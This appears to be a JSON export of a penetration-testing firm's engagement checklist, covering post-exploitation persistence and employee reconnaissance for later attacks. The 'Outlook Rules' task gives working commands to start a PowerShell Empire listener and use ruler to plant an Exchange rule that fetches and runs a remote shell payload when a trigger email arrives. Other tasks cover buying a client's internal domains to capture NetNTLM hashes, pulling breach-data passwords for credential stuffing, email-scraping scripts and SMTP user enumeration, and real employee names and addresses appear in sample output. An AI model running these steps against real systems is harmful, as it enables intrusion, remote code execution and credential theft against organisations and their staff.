{
    "default_url": null,
    "content": {
        "categories": [
            {
                "ordinal": 17,
                "id": 350449,
                "name": "Post Exploitation: Pivotting & C2 Options",
                "description": "This group of tasks is intended to provide guidance around  maintaining access to target environments once they have been compromised.",
                "categoryType": "Capture the Flag",
                "tasks": [
                    {
                        "name": "Cloud - Azure Environment",
                        "state": 3,
                        "comments": 0,
                        "uid": "c40c94d0-2af0-11ee-9182-27453a4f962c",
                        "ordinal": 1,
                        "masterFindingId": null,
                        "taskInstructions": "",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Reverse Shell: Cobalt Strike Payloads",
                        "state": 3,
                        "comments": 0,
                        "uid": "c40f6476-2af0-11ee-9189-b3e3cf900c11",
                        "ordinal": 5,
                        "masterFindingId": null,
                        "taskInstructions": "",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Reverse Shell: SSH Payloads",
                        "state": 3,
                        "comments": 0,
                        "uid": "c40e93de-2af0-11ee-9184-47966a96312d",
                        "ordinal": 8,
                        "masterFindingId": null,
                        "taskInstructions": "",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Cloud - AWS Environment",
                        "state": 3,
                        "comments": 0,
                        "uid": "c40e60bc-2af0-11ee-9183-1381de33bece",
                        "ordinal": 0,
                        "masterFindingId": null,
                        "taskInstructions": "",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "WebShell",
                        "state": 3,
                        "comments": 0,
                        "uid": "c40fbc0a-2af0-11ee-918b-2f9e54df26c6",
                        "ordinal": 14,
                        "masterFindingId": null,
                        "taskInstructions": "",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Reverse Shell: Empire Payloads",
                        "state": 3,
                        "comments": 0,
                        "uid": "c4109b34-2af0-11ee-918f-93d30a7ee925",
                        "ordinal": 6,
                        "masterFindingId": null,
                        "taskInstructions": "",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Outlook Rules",
                        "state": 3,
                        "comments": 0,
                        "uid": "c410c744-2af0-11ee-9190-43ee97f6d49d",
                        "ordinal": 4,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nCreate Outlook rule in a victim's Exchange account to execute commands when an email is received with specific keywords.\n\n<h2><b>Malicious Outlook Rules</b></h2>\n\n<b>Prerequisites</b>\nVALID Domain credentials\nVictim mail server with Autodiscover turned on\nVerify by visiting http://autodiscover.&lt;your domain&gt;/autodiscover/autodiscover.xml, should get a valid XML file\n\n<b>Setup </b>\nInstall docker at https://docs.docker.com/engine/installation/\nGet Docker image for WebDav server and exploit tools at S:Docker\netspi_autodiscover\nLoad Docker image docker load -i ./netspi_autodiscover\nStart Docker image docker run -p 80:80 -p 8080:8080 -i -t netspi/autodiscover /bin/bash\nThis will start a container running the webdav server, -p 80:80 binds http://localhost:80 to the Docker container.\nThis means you will use the public IP of the host machine as the webdav server, not the Docker container.\nPort 8080 will be for Empire to be listening on for agents.\nStart Powershell Empire and create a listener payload\n<ncode>$&gt; docker ps &#35;if not already attached to container\n$&gt; docker attach [container_name] &#35;if not already attached to container\n$&gt; su safeuser &#35;password is safeuser\n$&gt; cd ~/Empire\n$&gt; sudo python Empire\n$&gt; listeners\n$&gt; set Host http://[ip_of_host_machine_not_docker]:8080\n$&gt; execute\n$&gt; usestager launcher test\n$&gt; execute\n</ncode>\nCopy the command string from Empire\nSave it into a .bat file and place at docker_machine:/var/www/webdav/\nYou can verify it by visiting http://localhost/webdav on the host machine\nOnce the file is saved open empire again and do the next step in another terminal\n\n<b>Execution</b>\n<ncode>$&gt; docker ps\n$&gt; docker attach [container_name]\n$&gt; su safeuser &#35;password is safeuser\n$&gt; cd ~/go/src/github.com/sensepost/ruler\n$&gt; go run ruler.go --email user@targetdomain.com --username username --password password add --location &quot;\\\\your_host_server_not_docker:80\\webdav\\shell.bat&quot; --trigger &quot;pop a shell&quot; --name maliciousrule\n</ncode>\nYou can add the --send flag and it will automatically send an email to trigger the shell after 30 seconds\nOtherwise email the victim at --email with --trigger in the subject of the email.\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Reverse Shell: Metasploit Payloads",
                        "state": 3,
                        "comments": 0,
                        "uid": "c4107848-2af0-11ee-918e-7bca4d841fb4",
                        "ordinal": 7,
                        "masterFindingId": null,
                        "taskInstructions": "",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Reverse Shell: SMTP Payloads",
                        "state": 3,
                        "comments": 0,
                        "uid": "c40f0814-2af0-11ee-9187-a34f34f8e092",
                        "ordinal": 12,
                        "masterFindingId": null,
                        "taskInstructions": "",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Reverse Shell: ICMP Payloads",
                        "state": 3,
                        "comments": 0,
                        "uid": "c40eb3be-2af0-11ee-9185-4b7c5f48b9cb",
                        "ordinal": 10,
                        "masterFindingId": null,
                        "taskInstructions": "",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Purchase Internal Domain Names",
                        "state": 3,
                        "comments": 0,
                        "uid": "c40fe914-2af0-11ee-918c-bb12f96fc2d9",
                        "ordinal": 13,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nReview common code repositories, and Microsoft managed service endpoints for internal domain names for the client. Then purchase the domain name, assign the IP to a NetSPI server, and capture NetNTLM password  hashes or proxy traffic.\n<b>Reference:</b> https://room362.com/post/2016/buying-internal-domain-access/\n\n<b>Get a list of internal active domains for the company</b>\n1. Review github.\n2. Review bitbucket.\n3. Review owa.\n4. Scrape http or other protocols for ntlm responses to get domains.\n5. managed services?\n\n<b>Purchase domain names</b>\n1. purchase the domain name.\n2. assign the IP to a NetSPI server.\n\n<b>Capture NetNTLM password  hashes or proxy traffic</b>\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Reverse Shell: Generic TCP/UDP Payloads",
                        "state": 3,
                        "comments": 0,
                        "uid": "c40fa710-2af0-11ee-918a-3b6a30e6d45e",
                        "ordinal": 9,
                        "masterFindingId": null,
                        "taskInstructions": "",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Single Factor Roaming Profiles",
                        "state": 3,
                        "comments": 0,
                        "uid": "c41066dc-2af0-11ee-918d-2f314fedc723",
                        "ordinal": 3,
                        "masterFindingId": null,
                        "taskInstructions": "Work in process.\n\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Reverse Shell: DNS Payloads",
                        "state": 3,
                        "comments": 0,
                        "uid": "c40f1ca0-2af0-11ee-9188-23785b90b117",
                        "ordinal": 11,
                        "masterFindingId": null,
                        "taskInstructions": "",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Single Factor One Cloud",
                        "state": 3,
                        "comments": 0,
                        "uid": "c40ed9ac-2af0-11ee-9186-af5905900cde",
                        "ordinal": 2,
                        "masterFindingId": null,
                        "taskInstructions": "Work in process with workfolders.\n\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    }
                ],
                "fields": []
            },
            {
                "ordinal": 4,
                "id": 350450,
                "name": "Reconnaissance: Employees",
                "description": "The goal of this task group is to identify employees, email addresses, and usernames that can be used in future attacks.",
                "categoryType": "None",
                "tasks": [
                    {
                        "name": "[OPTIONAL] Employee - ZoomInfo [Manual] [Search Tools]",
                        "state": 3,
                        "comments": 0,
                        "uid": "c4139d70-2af0-11ee-91a1-cb2d7fe760ff",
                        "ordinal": 8,
                        "masterFindingId": 17064436,
                        "taskInstructions": "<h2>Instructions</h2>\nEnumerate employee emails.\n\n<b>Import Note: This script is broken at the moment due to updates to one of the libraries.  It will return to REQUIRED status once fixes have been applied to the code, but for not DO NOT USE this. Alternatively, you can use the manual method outlined below.</b>\n\n<h2><b>Variation: Manual</b></h2>\n1. Query Google to find the company's ZoomInfo page. A sample query is shown below:\n<ncode>site:zoominfo.com/c/ &quot;Patriot Growth Insurance Services&quot;\n</ncode>\n2. You should be able to find a company page that looks similar to the following URL (note the &quot;/c/&quot; part of the URL):\n<ncode>https://www.zoominfo.com/c/patriot-growth-insurance-services-llc/416005685\n</ncode>\n3. Click the &quot;Find more contacts&quot; link on the right side of the company's profile page.\n4. Using the mouse, highlight the table of employee information, right-click, and copy it. Paste the information into a text file. Use the paging links at the bottom of the page to page to the next table of results and continue to add to the text file. When complete, the text file should look similar to this:\n<ncode>$ head -n 25 names.txt\nprofile photo for Valentina Miniscalco\nValentina Miniscalco\nemailEmail\ndirectDirect\nHR Assistant\nUnited States, Pennsylvania, Fort Washington\n6/14/2022\nprofile photo for Josh Wang\nJosh Wang\nemailEmail\ndirectDirect\nInformation Technology Support\nUnited States, Pennsylvania, Fort Washington\n6/14/2022\nprofile photo for Gregory Hancock\nGregory Hancock\nemailEmail\ndirectDirect\n-\nUnited States, Pennsylvania, Fort Washington\n6/14/2022\nprofile photo for Jesse Velichko\nJesse Velichko\nemailEmail\ndirectDirect\n</ncode>\n5. Using awk, extract the names from the text file:\n<ncode>$ awk '/profile/{getline; print}' names.txt\nValentina Miniscalco\nJosh Wang\nGregory Hancock\nJesse Velichko\nBryan Leuszler\nAmber Anderson\nTammy Cameron\n...\n</ncode>\n6. Finally, copy the info into a text editor, replace the space characters with a tab character, and then copy the data into Excel. You should end up with two columns, one with the first name and one with the last name. Use Excel formulas to change the data into the correct email address format desired. An example of formatting John Smith into a jsmith@domain.com email address is shown below:\n<ncode>=LOWER(CONCAT(LEFT(TRIM(A1),1),TRIM(B1),&quot;@domain.com&quot;))\n</ncode>\n<h2><b>Variation: Zoominfo-scraper.py</b></h2>\n1. Download the zoominfo script. Github has instructions on setting up and using.\n<ncode>https://github.com/NetSPI/OSINT/tree/master/Zoominfo\n</ncode>\n2. Google dork your target &quot;domain.com&quot; like so:\n<ncode>site:zoominfo.com domain.com\n</ncode>\n3. Pick the correct instance (usually the first) and give the script everything after &quot;https://www.zoominfo.com/c/&quot; as -z, e.g.,\n<ncode>-z 'netspi-inc/36078304'\n</ncode>\nThere are three format (-f) options:\n<ol><li>flast@domain.tld (e.g., jdoe@netspi.com) (default)</li>\n<li>first.last@domain.tld (e.g., john.doe@netspi.com)</li>\n<li>Full name (e.g., John Marie Doe)</li>\n</ol>\n4. Run the script.\n<ncode>python3 zoominfo-scraper.py -z zoominfo/path (-d domain.tld) (-f 2)\n</ncode>\n<h2><b>Report Verification</b></h2>\nPlease add the discovered email addresses to a list provided as an auxiliary deliverable to the client.\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "[OPTIONAL] Employee - RocketReach.co [Manual]",
                        "state": 3,
                        "comments": 0,
                        "uid": "c412d264-2af0-11ee-919d-ef60eea4239c",
                        "ordinal": 9,
                        "masterFindingId": 17064433,
                        "taskInstructions": "<h2>Instructions</h2>\nUsing known email domains, search for employee email addresses using the https://rocketreach.co. This process is currently manual.\n\n<h2>Variation: Google Dork</h2>\nSearch for employee emails using the Google dork below:\n<ncode>site:rocketreach.co @emaildomain.com\n</ncode>\n<h2>Variation: Manual</h2>\n1. Search for employee via the Google dork below. Replace emaildomain.com with your target company's domain.\n<ncode>site:rocketreach.co @emaildomain.com\n</ncode>\n2. Check RocketReach.co pages for employees.\n\n<h2><b>Report Verification</b></h2>\nPlease add this finding to the workspace and add the discovered email addresses as a verification item.\n\n<h3><b>Additional Notes</b></h3>\nUse the &quot;Employee - Gather Contacts&quot; checklist Burp Scripter with the following script:\n<ncode>if not messageIsRequest:\n  response = messageInfo.getResponse()\n  analyzedResponse = helpers.analyzeResponse(response)\n  headerList = analyzedResponse.getHeaders()\n  bodyStr = helpers.bytesToString(response[analyzedResponse.getBodyOffset():]).encode('ascii','ignore')\n  if &quot;email &amp; phone&quot; in bodyStr:\n    strs = bodyStr.split(&quot;email &amp; phone&quot;)\n    strs.pop(-1) &#35;remove the last item\n    for str in strs:\n      try:\n        name = (str.rsplit(&quot;x3e&quot;,1)[1]).strip()\n      except:\n        x=&quot;test&quot;\n      try:\n        name = (str.rsplit(&quot;\\&quot;&gt;&quot;,1)[1]).strip()\n        if &quot;=\\&quot;&quot; in name:\n          name = str.rsplit(&quot;=\\&quot;&quot;,1)[1]\n        if &quot;&lt;title&gt;&quot; in name:\n          name = (str.rsplit(&quot;&lt;title&gt;&quot;,1)[1]).strip()\n      except:\n        x=&quot;test&quot;\n      print name\n  if &quot;email &amp; phone&quot; in bodyStr:\n    strs = bodyStr.split(&quot;email &amp; phone&quot;)\n    strs.pop(-1) &#35;remove the last item\n    for str in strs:\n      try:\n        name = (str.rsplit(&quot;x3e&quot;,1)[1]).strip()\n      except:\n        x=&quot;test&quot;\n      try:\n        name = (str.rsplit(&quot;\\&quot;&gt;&quot;,1)[1]).strip()\n        if &quot;=\\&quot;&quot; in name:\n          name = str.rsplit(&quot;=\\&quot;&quot;,1)[1]\n        if &quot;&lt;title&gt;&quot; in name:\n          name = (str.rsplit(&quot;&lt;title&gt;&quot;,1)[1]).strip()\n      except:\n        x=&quot;test&quot;\n      print name\n</ncode>\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Employee - Breach Data [NetSPI Tool]",
                        "state": 2,
                        "comments": 1,
                        "uid": "c4131670-2af0-11ee-919f-b390939c1698",
                        "ordinal": 0,
                        "masterFindingId": 17063363,
                        "taskInstructions": "<h2>Instructions</h2>\nUsing known email domains, search for employee email addresses and potential passwords in breach data.\n\n<b>NOTE: DO NOT</b> use credentials discovered within the data breach sets to attempt to login to websites that aren't directly associated with the client. For example, if BreachDB contains user credentials that were part of the LinkedIn data breach, do not attempt to use those credentials to log in to LinkedIn's website as that user. The intent of these credentials is for credential stuffing and password guessing attacks against in-scope assets during an engagement.\n\n<h2>Variation: Automation with Invoke-BreachDB</h2>\n1. Navigate to https://github.com/NetSPI/PowerShell-Private/tree/master/BreachDB\n2. Follow the instructions in the readme for setup and execution, but common commands have been listed below.\n\n<h3>Examples:</h3>\n<ncode>Invoke-BreachDB-Query -domain 'netspi.com' Invoke-BreachDB-Query -domain 'netspi.com' -source 'linkedin2016'\nInvoke-BreachDB-Query -email 'lee.buttke@netspi.com'\n</ncode>\n<h2>Variation: Manual Review Options</h2>\n1. Visit https://haveibeenpwned.com\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Employee - Hunter.io [Commercial API]",
                        "state": 2,
                        "comments": 1,
                        "uid": "c4118ce2-2af0-11ee-9197-1fe4c6fb9370",
                        "ordinal": 1,
                        "masterFindingId": 17063360,
                        "taskInstructions": "<h2>Instructions</h2>\nEnumerate known employees and emails. Using known email domains, search for employee email addresses using the https://hunter.io.\n\nRefer to the Consultants - OSINT list in passwords for credentials/API key. \n<b>Username:</b> IT@NetSPI.com\n<b>Password:</b>  https://passwords.netspi.com/pid=20625\n\n<h3><b>Automation</b></h3>\n1.  Install PyHunter\n<ncode>pip install pyhunter\n</ncode>\n2.  Insert Hunter API key into the script. A Hunter API key is required to use this tool.\nThe NetSPI API key that needs to be inserted into the script prior to use is:\nhttps://passwords.netspi.com/pid=31032\n<ncode>&#35; insert API key here\napiKey = ''\nhunter = PyHunter(apiKey)\n</ncode>\n3. Run hunterio.py.\n<ncode>$ python3 hunterio.py netspi.com\n\n[+] Found 10 email addresses for netspi.com domain:\n[-] Getting page 1 of results...\n[+] Discovered email addresses:\ncody.wass@netspi.com\ndavid.gordon@netspi.com\ngina.price@netspi.com\nalex@netspi.com\ngprice@netspi.com\nmary.braunwarth@netspi.com\nharold@netspi.com\nantti.rantasaari@netspi.com\ndavid.schlais@netspi.com\nkarl.fosaaen@netspi.com\n</ncode>\n<h3><b>Hunterio.py Source Code</b></h3>\n<b>Source:</b> https://github.com/NetSPI/OSINT/tree/master/Hunter.io\n<ncode>&#35;!/usr/bin/python3\nimport argparse\nimport csv\nfrom pyhunter import PyHunter\nimport sys\n\n&#35; insert API key here\napiKey = ''\nhunter = PyHunter(apiKey)\n\nparser = argparse.ArgumentParser(description='Search hunter.io for email addresses associated with a particular domain.')\nparser.add_argument('domain', metavar='D', help='an email domain name to search hunter.io for -- Ex: netspi.com')\nparser.add_argument('--outputPath', metavar='O', help='file to output CSV results -- Ex: /root/tools/myoutput.csv')\n\nargs = parser.parse_args()\n\nfinalEmailList = []\n\ndef queryAPI(domainVal, limitVal = 100, emails_typeVal = 'personal', offsetVal=0):\n  &quot;&quot;&quot;Calls the hunter.io API to search for email addresses for supplied domain\n\n  Args:\n    domainVal (string): Name of the domain to search -- Ex: netspi.com\n    limitVal (int): Maximum number of results to return per query (100 max)\n    emails_typeVal (string): 'personal' or 'generic' -- 'generic' includes\n    addresses like 'sales@netspi.com', whereas\n    'personal' only returns names of individuals\n    offsetVal (int): The number of emails to skip during a query\n  Returns:\n    bool: (dict): raw API response dictionary\n\n  &quot;&quot;&quot;\n  try:\n    return hunter.domain_search(domain=domainVal, limit=limitVal, emails_type=emails_typeVal, raw=True, offset=offsetVal).json()\n  except:\n   sys.exit(&quot;[x] ERROR: Failure during API search call to hunter.io. Check your API key.&quot;)\n\n\n&#35; iterate through the first set of results and store the emails\npageNum = 1\n\ntry:\n  apiResponse = queryAPI(args.domain)\n  emailCount = apiResponse['meta']['results']\nexcept:\n  sys.exit(&quot;[x] ERROR: Failure parsing JSON API response.&quot;)\n\nif emailCount == 0:\n  sys.exit(&quot;[x] No email addresses found for {} domain.&quot;.format(args.domain))\nelif emailCount == 1:\n  print(&quot;[+] Found 1 email address for {} domain:&quot;.format(args.domain))\nelse:\n  print(&quot;[+] Found {} email addresses for {} domain:&quot;.format(emailCount, args.domain))\n\nprint(&quot;[-] Getting page {} of results...&quot;.format(pageNum))\nfor email in apiResponse['data']['emails']:\n  finalEmailList.append(email['value'])\n\npageNum += 1\n\n&#35; if more than 100 emails exist, it requires paging through the results 100 at a time\nif emailCount &gt; 100:\n  offsetCount = 100\n\n  while emailCount &gt; offsetCount:\n    print(&quot;[-] Getting page {} of results...&quot;.format(pageNum))\n    apiResponse = queryAPI(args.domain, offsetVal=offsetCount)\n    for email in apiResponse['data']['emails']:\n      finalEmailList.append(email['value'])\n\n    offsetCount += 100\n    pageNum += 1\n\nif args.outputPath:\n  &#35; output final result set to CSV\n  print(&quot;[+] Writing output to {}&quot;.format(args.outputPath))\n  try:\n    with open(args.outputPath, 'w', newline='') as f:\n      writer = csv.writer(f)\n      for email in finalEmailList:\n        writer.writerow([email])\n  except:\n    sys.exit(&quot;[x] ERROR: Could not write output file to {}&quot;.format(args.outputPath))\nelse:\n  print(&quot;[+] Discovered email addresses:&quot;)\n  for email in finalEmailList:\n    print(email)\n</ncode>\n<h2><b>Report Verification</b></h2>\nPlease add this finding to the workspace and add the discovered email addresses as a verification item.\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Employee - Gather Contacts [Search Tools]",
                        "state": 2,
                        "comments": 1,
                        "uid": "c411e0b6-2af0-11ee-9198-77cd482b0659",
                        "ordinal": 3,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nEnumerate known employees and emails.\n\n<h2>Variation: Manual Review</h2>\n<b>Follow the setup and instructions from:</b>\n<ncode>https://github.com/clr2of8/GatherContacts\n</ncode>\n<b>Blog post outlining the tool/technique:</b>\n<ncode>https://www.blackhillsinfosec.com/gathering-usernames-from-google-linkedin-results-using-burp-suite-pro/\n</ncode>\nThis Python script can take the output of the Burp plugin and parse into email addresses:\n<ncode>https://github.com/NetSPI/Scripts-Private/blob/master/gathercontacts-parser.py\n</ncode>\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "[PENDING] http://breachsense.io/",
                        "state": 3,
                        "comments": 0,
                        "uid": "c41115fa-2af0-11ee-9193-7ff8a810ee08",
                        "ordinal": 20,
                        "masterFindingId": null,
                        "taskInstructions": null,
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "[OPTIONAL] Employee - Rain King [Manual]",
                        "state": 3,
                        "comments": 0,
                        "uid": "c412a974-2af0-11ee-919c-6f9a7dc6e83b",
                        "ordinal": 12,
                        "masterFindingId": 17063365,
                        "taskInstructions": "<h2>Instructions</h2>\nEnumerate company employees. Using known email domains, search for employee email addresses using the RainKing. This process is currently manual. Purchase a license for RainKing or make a request to the sales to obtain a list of email addresses for the target company.\n\n<h2>Variation: Manual</h2>\n1. Visit the URL below and perform searches.\n<ncode>https://app.rainkingonline.com/login/auth\n</ncode>\n<h2><b>Report Verification</b></h2>\nPlease add this finding to the workspace and add the discovered email addresses as a verification item.\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "[OPTIONAL] Email Addresses - Verify - HTTP",
                        "state": 3,
                        "comments": 0,
                        "uid": "c4140d28-2af0-11ee-91a3-3733303b2835",
                        "ordinal": 17,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nConsider reviewing identified web applications for forms that can be used to verify email addresses. However, try to stay away from &quot;password reset&quot; forms, but &quot;forgot password&quot; forms can be very useful.\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Employee - Simply Email [Search Tools]",
                        "state": 2,
                        "comments": 1,
                        "uid": "c411f47a-2af0-11ee-9199-1b9d6b78a315",
                        "ordinal": 5,
                        "masterFindingId": 17063362,
                        "taskInstructions": "<h2>Instructions</h2>\nEnumerate known employees and emails.  \n\n<h2>Variation: SimplyEmail via Docker</h2>\nSee Github for more info: \n<ncode>https://github.com/SimplySecurity/SimplyEmail\n</ncode>\n1. Download the docker container.\n<ncode>root@kali:~&#35; docker pull simplysecurity/simplyemail\n</ncode>\n2. Start the docker container.\n<ncode>root@kali:~&#35; docker run --rm --entrypoint /bin/bash -ti simplysecurity/simplyemail\n</ncode>\n3. Run the tool.\n<ncode>./SimplyEmail.py -all -e domain.com\n</ncode>\n\n<h2>Variation: SimplyEmail</h2>\n1. Download and install the tools from https://github.com/SimplySecurity/SimplyEmail or use the version on Kali.\n<ncode>git clone https://github.com/SimplySecurity/SimplyEmail.git\n</ncode>\n2. Run the tool.\n<ncode>./SimplyEmail.py -all -e example.com\n</ncode>\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Upload List of Employees ",
                        "state": 2,
                        "comments": 0,
                        "uid": "c412fa64-2af0-11ee-919e-1b251aee927b",
                        "ordinal": 21,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\n1. Upload a list of the enumerated employees to the Documents section of the Resolve Platform.\n2. Please place contents in a well labeled .csv or .xls document.\n3. When possible include the domain, employee name, and user name.\n4. Make sure to publish it so it is visible to the client in Track.\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "[OPTIONAL] Email Addresses - Verify - SMTP",
                        "state": 3,
                        "comments": 0,
                        "uid": "c413e8a2-2af0-11ee-91a2-df011df1c934",
                        "ordinal": 16,
                        "masterFindingId": 122366,
                        "taskInstructions": "<h2>Instructions</h2>\nIf a mail server is in scope the VRY command (among others) can be used to validate the email addresses discovered via public resources. Additionally, some web applications that support integrated authentication will respond with differently if a validate domain user is provided.\n<ul><li>Once the accounts and emails are verified they can be used in dictionary and phishing attacks.</li>\n<li>Verify potential email addresses.</li>\n<li>Verify potential domain account when possible.</li>\n</ul>\n<h2><b>Variation: Metasploit</b></h2>\n1. Launch Metasploit.\n<ncode>msfconsole\n</ncode>\n2. Use the smtp_enum module.\n<ncode>use auxiliary/scanner/smtp/smtp_enum\n</ncode>\n3. Set the list of email address enumerated through parsing social media. \n<ncode>set user_file /tmp/emails_list.txt\n</ncode>\n4. Set the remote IP.\n<ncode>set rhosts IP\n</ncode>\n5. Exploit.\n<ncode>exploit\n</ncode>\nAlternatively, use the script from pentest monkey.\n<ncode>http://pentestmonkey.net/tools/user-enumeration/smtp-user-enum\n</ncode>\n<h2><b>Variation: Manual</b></h2>\n1. Use telnet to connect to the SMTP port.\n<ncode>$ telnet x.x.x.x 25\nTrying x.x.x.x...\nConnected to mail.test.com (x.x.x.x).\nEscape character is '^]'.\n220 mail.test.com ESMTP\nehlo localhost\n250-mail.test.com\n250-8BITMIME\n250 SIZE 10485760\nvrfy root\n252 ok\n</ncode>\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "[OPTIONAL] Employee - leadferret.com [Manual]",
                        "state": 3,
                        "comments": 0,
                        "uid": "c410fb88-2af0-11ee-9192-9f3856ed51d3",
                        "ordinal": 11,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nEnumerate company employees.\n\n<h2>Variation: Manual Review</h2>\n1.  Execute the following Google dork. Replace artisanpartners.com with your target domain.\n<ncode>site:leadferret.com artisanpartners.com\n</ncode>\n2. Once you know the company URL you can also perform Google dorking like the following:\n<ncode>site:leadferret.com directory/company/ company.com\nsite:leadferret.com directory/company/ target.com\n</ncode>\n<b>Note: </b>Large companies seem to have multiple URLs. However, there may be some way to crawl them all.\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "[OPTIONAL] Email Addresses - Verify - 0365",
                        "state": 3,
                        "comments": 0,
                        "uid": "c4148f14-2af0-11ee-91a6-2b1522751ade",
                        "ordinal": 14,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nEnumerate usernames via O365 endpoints.\n<h3>References</h3>\n<ncode>https://github.com/knavesec/CredMaster (o365enum module)\nhttps://github.com/nyxgeek/onedrive_user_enum\n<a href='https://github.com/dafthack/MSOLSpray'>https://github.com/dafthack/MSOLSpray</a>\n</ncode>\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Employee - TheHarvestor.py [Search Tools]",
                        "state": 2,
                        "comments": 1,
                        "uid": "c4127f26-2af0-11ee-919b-573b1066bbaa",
                        "ordinal": 4,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nEnumerate known employees and emails. \n\n<h2>Variation: TheHarvester</h2>\n1. Download and install the tool from https://github.com/laramies/theHarvester or just via apt on Kali.\n<ncode>sudo apt install theharvester\n</ncode>\n2.  Run the tool.\n<ncode>theharvester -d &quot;company.com&quot; -b all\n</ncode>\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "[OPTIONAL] Employee - LinkedIn Parser [Search Tools]",
                        "state": 3,
                        "comments": 0,
                        "uid": "c41124a0-2af0-11ee-9194-37db92bc1e91",
                        "ordinal": 13,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nThis script uses your personal LinkedIn account and scrapes the names of employees of the target client out of Burp. There is no automated crawling. \n\n<h2><b>Variation: Assisted Crawl with LinkedInParer.jar</b></h2>\n1. Navigate to the releases page.\n<ncode>https://github.com/NetSPI/LinkedInParser/releases\n</ncode>\n2. Download LinkedInParser.jar\n\n3. Within Burp Extender, add the new .jar file.  \n\n4. Follow usage instructions from:\n<ncode>https://github.com/NetSPI/LinkedInParser.\n</ncode>\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Usernames - Determine Format",
                        "state": 2,
                        "comments": 1,
                        "uid": "c413613e-2af0-11ee-91a0-9f8ced0bb4d3",
                        "ordinal": 7,
                        "masterFindingId": 17064435,
                        "taskInstructions": "<h2>Instructions</h2>\nDetermine the company's username format. Try to determine what the domain user format is.\n\n<h3><b>User IDs Tips</b></h3>\n<ul><li>Most companies base user IDs on the employee's first and last names</li>\n<li>However, many large financial organizations use a letter follow by 4-8 numbers. In some cases this is easier, because we can just generate a list of potential user IDs and test to see if the exist by attempting authentication through different mediums</li>\n</ul>\n<h3><b>Google Dorks</b></h3>\nUse Google dorks to search for company related files and information. Below are some recommendations. Search for file types on company websites:\n<ncode>site:companysite.com filetype:config\nsite:companysite.com filetype:txt\nsite:companysite.com filetype:xml\nsite:companysite.com filetype:xls\n</ncode>\n<b>Note:</b> You can get usernames from xls, doc, and pdf files found on company related sites. Looking on forums can also help.\n\n<h3><b>Github</b></h3>\nFollow the github guidlines in the company files category to search Github for usernames and other information.\n\n<h3><b>Company Registration Information</b></h3>\nConsider reviewing emails registered to company owned IP blocks and domains.\n",
